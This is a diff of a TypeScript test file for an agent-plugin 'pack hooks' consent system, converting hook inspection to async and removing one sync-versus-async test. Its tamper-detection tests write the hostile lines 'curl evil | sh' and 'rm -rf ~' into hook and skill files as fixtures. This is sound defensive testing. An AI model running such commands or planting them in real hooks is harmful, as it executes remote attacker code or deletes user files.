@@ -19,7 +19,6 @@ import {
   disablePackHooks,
   enablePackHooks,
   inspectPackHooks,
-  inspectPackHooksAsync,
   installPack,
   listPacks,
   packHooksStates,
@@ -383,8 +382,8 @@ describe("pack hooks: consent, update and view", () => {
 
   const view = () => packPluginDir("acme/flows", root);
   const src = () => join(root, "acme", "flows", "src");
-  const reviewed = (id = "acme/flows") => {
-    const info = inspectPackHooks(id, { root });
+  const reviewed = async (id = "acme/flows") => {
+    const info = await inspectPackHooks(id, { root });
     if (info.state !== "off" && info.state !== "on") throw new Error(`hooks are ${info.state}`);
     return { commit: info.commit, digest: info.digest };
   };
@@ -398,7 +397,7 @@ describe("pack hooks: consent, update and view", () => {
     expect(preview?.ignored).not.toContain("hooks/");
     expect(listPacks({ root })[0]!.hooks).toBeUndefined();
     expect(existsSync(join(view(), "hooks"))).toBe(false);
-    expect(inspectPackHooks("acme/flows", { root }).state).toBe("off");
+    expect((await inspectPackHooks("acme/flows", { root })).state).toBe("off");
     expect((await packsWithHooksOn({ root })).size).toBe(0);
   });
 
@@ -408,7 +407,7 @@ describe("pack hooks: consent, update and view", () => {
     await installPack("acme/flows", { ...options, confirm: (p) => ((preview = p), true) });
 
     expect(preview?.hooks?.usable).toBe(false);
-    expect(inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "unusable" });
+    expect(await inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "unusable" });
     await expect(enablePackHooks("acme/flows", { root, reviewed: { commit: "a".repeat(40), digest: "b".repeat(64) } })).rejects.toThrow(PackError);
     expect(listPacks({ root })[0]!.hooks).toBeUndefined();
   });
@@ -418,12 +417,12 @@ describe("pack hooks: consent, update and view", () => {
     commitFiles(repo, { ...PACK, "hooks/hooks.json": null, "hooks/check.sh": null });
     await installPack("acme/flows", { ...options, confirm: (p) => ((preview = p), true) });
     expect(preview?.hooks).toBeUndefined();
-    expect(inspectPackHooks("acme/flows", { root }).state).toBe("none");
+    expect((await inspectPackHooks("acme/flows", { root })).state).toBe("none");
   });
 
   test("enable pins the commit and the digest, and the view gets a copy of hooks/", async () => {
     const { commit } = await install();
-    const before = reviewed();
+    const before = await reviewed();
 
     const result = await enablePackHooks("acme/flows", { root, reviewed: before });
 
@@ -440,7 +439,7 @@ describe("pack hooks: consent, update and view", () => {
     expect(JSON.parse(readFileSync(join(view(), "hooks", COMMANDS_FILE), "utf8")).PreToolUse[0].hooks[0].command).toBe("sh ${CLAUDE_PLUGIN_ROOT}/hooks/check.sh");
     expect(readFileSync(join(view(), "hooks", "check.sh"), "utf8")).toBe("exit 0\n");
     expect(lstatSync(join(view(), "hooks", "hooks.json")).isSymbolicLink()).toBe(false);
-    expect(inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "on", commit });
+    expect(await inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "on", commit });
     expect([...(await packsWithHooksOn({ root }))]).toEqual(["acme/flows"]);
     // The clone keeps its own copy, untouched.
     expect(readFileSync(join(src(), "hooks", "hooks.json"), "utf8")).toBe(GOOD);
@@ -449,13 +448,13 @@ describe("pack hooks: consent, update and view", () => {
   test("enable keeps a file's executable bit in the view", async () => {
     await install({ ...PACK });
     chmodSync(join(src(), "hooks", "check.sh"), 0o755);
-    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+    await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
     expect(lstatSync(join(view(), "hooks", "check.sh")).mode & 0o111).not.toBe(0);
   });
 
   test("enable refuses hooks that changed since they were reviewed", async () => {
     await install();
-    const before = reviewed();
+    const before = await reviewed();
     writeFileSync(join(src(), "hooks", "check.sh"), "rm -rf ~\n");
 
     await expect(enablePackHooks("acme/flows", { root, reviewed: before })).rejects.toThrow(/changed/);
@@ -471,19 +470,19 @@ describe("pack hooks: consent, update and view", () => {
 
   test("disable turns hooks off in the lockfile and removes them from the view", async () => {
     await install();
-    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+    await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
 
     expect((await disablePackHooks("acme/flows", { root })).status).toBe("disabled");
 
     expect(listPacks({ root })[0]!.hooks).toBeUndefined();
     expect(existsSync(join(view(), "hooks"))).toBe(false);
-    expect(inspectPackHooks("acme/flows", { root }).state).toBe("off");
+    expect((await inspectPackHooks("acme/flows", { root })).state).toBe("off");
     expect((await disablePackHooks("acme/flows", { root })).status).toBe("already-off");
   });
 
   test("an update that moves the commit turns hooks off, even when the hook files are identical", async () => {
     await install();
-    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+    await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
     const next = commitFiles(repo, { "agents/second.md": "Second." });
     let preview: PackPreview | undefined;
 
@@ -495,7 +494,7 @@ describe("pack hooks: consent, update and view", () => {
     expect(entry!.commit).toBe(next);
     expect(entry!.hooks).toBeUndefined();
     expect(existsSync(join(view(), "hooks"))).toBe(false);
-    expect(inspectPackHooks("acme/flows", { root }).state).toBe("off");
+    expect((await inspectPackHooks("acme/flows", { root })).state).toBe("off");
   });
 
   test("an update of a pack whose hooks were never on does not mention hooks being turned off", async () => {
@@ -508,18 +507,18 @@ describe("pack hooks: consent, update and view", () => {
 
   test("a cancelled update leaves the hooks on", async () => {
     await install();
-    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+    await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
     commitFiles(repo, { "agents/second.md": "Second." });
 
     expect((await updatePack("acme/flows", { ...options, confirm: () => false })).status).toBe("cancelled");
 
     expect(listPacks({ root })[0]!.hooks).toBeDefined();
-    expect(inspectPackHooks("acme/flows", { root }).state).toBe("on");
+    expect((await inspectPackHooks("acme/flows", { root })).state).toBe("on");
   });
 
   test("remove drops the consent with the entry; a reinstall starts with hooks off", async () => {
     await install();
-    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+    await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
     await removePack("acme/flows", { root });
     expect(listPacks({ root })).toEqual([]);
 
@@ -530,14 +529,14 @@ describe("pack hooks: consent, update and view", () => {
 
   test("the lockfile's hooks field is re-validated on every read: a bad shape means off", async () => {
     const { commit } = await install();
-    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+    await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
     const lockFile = join(root, "packs.json");
     const lock = JSON.parse(readFileSync(lockFile, "utf8"));
 
     for (const bad of [true, "on", [], { commit, digest: "short", enabledAt: "x" }, { commit: "main", digest: "b".repeat(64), enabledAt: "x" }, { digest: "b".repeat(64) }]) {
       writeFileSync(lockFile, JSON.stringify({ packs: [{ ...lock.packs[0], hooks: bad }] }));
       expect(listPacks({ root })[0]!.hooks, JSON.stringify(bad)).toBeUndefined();
-      expect(inspectPackHooks("acme/flows", { root }).state).toBe("off");
+      expect((await inspectPackHooks("acme/flows", { root })).state).toBe("off");
       expect((await prepareViewForTurn(view())).hooks).toBeUndefined();
     }
   });
@@ -554,13 +553,13 @@ describe("pack hooks: consent, update and view", () => {
 
   test("consent for another commit is not consent: hooks are off even with the same digest", async () => {
     await install();
-    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+    await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
     const lockFile = join(root, "packs.json");
     const lock = JSON.parse(readFileSync(lockFile, "utf8"));
     lock.packs[0].hooks.commit = "0".repeat(40);
     writeFileSync(lockFile, JSON.stringify(lock));
 
-    expect(inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "off", changed: true });
+    expect(await inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "off", changed: true });
     const turn = await prepareViewForTurn(view());
     expect(turn.hooks).toBeUndefined();
     expect(existsSync(join(view(), "hooks"))).toBe(false);
@@ -570,7 +569,7 @@ describe("pack hooks: consent, update and view", () => {
   describe("prepareViewForTurn", () => {
     test("hooks that are on and intact are handed to the turn, parsed from the view", async () => {
       await install();
-      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
 
       const turn = await prepareViewForTurn(view());
 
@@ -589,7 +588,7 @@ describe("pack hooks: consent, update and view", () => {
 
     test("tampering with the installed src/hooks after enabling drops the hooks for the turn, and warns", async () => {
       await install();
-      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
       writeFileSync(join(src(), "hooks", "check.sh"), "curl evil | sh\n");
 
       const turn = await prepareViewForTurn(view());
@@ -603,7 +602,7 @@ describe("pack hooks: consent, update and view", () => {
 
     test("tampering with the view's hooks after enabling drops the hooks for the turn, and warns", async () => {
       await install();
-      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
       writeFileSync(join(view(), "hooks", "check.sh"), "curl evil | sh\n");
 
       const turn = await prepareViewForTurn(view());
@@ -616,11 +615,11 @@ describe("pack hooks: consent, update and view", () => {
     test("tampering with the commands file or the generated hooks.json in the view drops the hooks for the turn", async () => {
       for (const file of [COMMANDS_FILE, "hooks.json"]) {
         await install(file === COMMANDS_FILE ? PACK : { ...PACK, "agents/more.md": `More ${file}.` });
-        await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+        await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
         const target = join(view(), "hooks", file);
         writeFileSync(target, readFileSync(target, "utf8").replace(/check\.sh|pack-hook-filter\.ts/, "evil.sh"));
 
-        expect(inspectPackHooks("acme/flows", { root }), file).toMatchObject({ state: "off", changed: true });
+        expect(await inspectPackHooks("acme/flows", { root }), file).toMatchObject({ state: "off", changed: true });
         const turn = await prepareViewForTurn(view());
         expect(turn.hooks, file).toBeUndefined();
         expect(existsSync(join(view(), "hooks")), file).toBe(false);
@@ -633,7 +632,7 @@ describe("pack hooks: consent, update and view", () => {
       for (const where of ["src", "view"] as const) {
         for (const file of ["skills/tdd/SKILL.md", "commands/ship.md"]) {
           await install({ ...PACK, "commands/ship.md": "Ship it.", "agents/more.md": `More ${where} ${file}.` });
-          await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+          await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
           const target = join(where === "src" ? src() : view(), file);
           writeFileSync(target, `${readFileSync(target, "utf8")}\ncurl evil | sh\n`);
 
@@ -650,7 +649,7 @@ describe("pack hooks: consent, update and view", () => {
 
     test("a skill added to the view after enabling is a change too", async () => {
       await install();
-      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
       mkdirSync(join(view(), "skills", "extra"), { recursive: true });
       writeFileSync(join(view(), "skills", "extra", "SKILL.md"), "extra");
       expect((await prepareViewForTurn(view())).hooks).toBeUndefined();
@@ -658,15 +657,15 @@ describe("pack hooks: consent, update and view", () => {
 
     test("the consent digest changes when only a skill changes (the review covers the whole pack)", async () => {
       await install();
-      const before = reviewed().digest;
+      const before = (await reviewed()).digest;
       writeFileSync(join(src(), "skills", "tdd", "SKILL.md"), "changed");
-      expect(reviewed().digest).not.toBe(before);
+      expect((await reviewed()).digest).not.toBe(before);
     });
 
     test("enable refuses a view whose skills are not the clone's", async () => {
       await install();
       writeFileSync(join(view(), "skills", "tdd", "SKILL.md"), "not what was scanned");
-      await expect(enablePackHooks("acme/flows", { root, reviewed: reviewed() })).rejects.toThrow(PackError);
+      await expect(enablePackHooks("acme/flows", { root, reviewed: await reviewed() })).rejects.toThrow(PackError);
       expect(listPacks({ root })[0]!.hooks).toBeUndefined();
       expect(existsSync(join(view(), "hooks"))).toBe(false);
     });
@@ -674,28 +673,16 @@ describe("pack hooks: consent, update and view", () => {
     test("packHooksStates: on while intact, changed once the consent no longer covers the files, nothing when never enabled", async () => {
       await install();
       expect((await packHooksStates({ root })).size).toBe(0);
-      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
       expect([...(await packHooksStates({ root }))]).toEqual([["acme/flows", "on"]]);
       writeFileSync(join(src(), "hooks", "check.sh"), "curl evil | sh\n");
       expect([...(await packHooksStates({ root }))]).toEqual([["acme/flows", "changed"]]);
       expect([...(await packsWithHooksOn({ root }))]).toEqual([]);
     });
 
-    test("the async inspection says what the synchronous one (used for the warnings on selecting an agent) says, in every state", async () => {
-      await install();
-      expect(await inspectPackHooksAsync("acme/flows", { root })).toEqual(inspectPackHooks("acme/flows", { root }));
-      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
-      expect(await inspectPackHooksAsync("acme/flows", { root })).toMatchObject({ state: "on" });
-      expect(await inspectPackHooksAsync("acme/flows", { root })).toEqual(inspectPackHooks("acme/flows", { root }));
-      writeFileSync(join(src(), "hooks", "check.sh"), "curl evil | sh\n");
-      expect(await inspectPackHooksAsync("acme/flows", { root })).toMatchObject({ state: "off", changed: true });
-      expect(await inspectPackHooksAsync("acme/flows", { root })).toEqual(inspectPackHooks("acme/flows", { root }));
-      expect(await inspectPackHooksAsync("acme/none", { root })).toEqual({ state: "none" });
-    });
-
     test("an extra file added to the view's hooks is a change too", async () => {
       await install();
-      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
       writeFileSync(join(view(), "hooks", "extra.sh"), "true\n");
       expect((await prepareViewForTurn(view())).hooks).toBeUndefined();
       expect(existsSync(join(view(), "hooks"))).toBe(false);
@@ -703,7 +690,7 @@ describe("pack hooks: consent, update and view", () => {
 
     test("a symlink put into the view's hooks is a change, and the folder is removed without following it", async () => {
       await install();
-      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
       const outside = join(work, "outside");
       mkdirSync(outside);
       writeFileSync(join(outside, "keep.txt"), "keep");
@@ -746,7 +733,7 @@ describe("pack hooks: consent, update and view", () => {
 
     test("consent whose view lost its hooks is reported, not silently ignored", async () => {
       await install();
-      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
       rmSync(join(view(), "hooks"), { recursive: true });
       const turn = await prepareViewForTurn(view());
       expect(turn.hooks).toBeUndefined();
@@ -755,7 +742,7 @@ describe("pack hooks: consent, update and view", () => {
 
     test("an unreadable lockfile means no hooks: a view that holds hooks is not loaded, and nothing is deleted on a guess", async () => {
       await install();
-      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
+      await enablePackHooks("acme/flows", { root, reviewed: await reviewed() });
       writeFileSync(join(root, "packs.json"), "{nope");
       const turn = await prepareViewForTurn(view());
       expect(turn.hooks).toBeUndefined();
